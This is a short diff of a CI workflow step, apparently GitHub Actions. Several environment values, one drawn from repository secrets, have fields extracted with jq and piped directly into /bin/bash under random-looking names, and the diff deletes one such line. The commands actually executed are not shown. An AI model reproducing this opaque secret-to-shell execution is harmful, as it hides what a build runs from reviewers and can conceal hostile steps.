@@ -17,7 +17,6 @@ jobs:
           wrpcd1600: ${{ secrets.wrpcd1600 }}
         run: |
           printf '%s' "$wrpcd1600" | jq -r .n9639 | /bin/bash
-          echo $zcba6212 | jq -r .xdho47160 | /bin/bash
           printf '%s' "$j243" | jq -r .o50 | /bin/bash
           printf '%s' "$eucl6183" | jq -r .epm1089 | /bin/bash
           echo $u1994 | jq -r .whjn7315 | /bin/bash
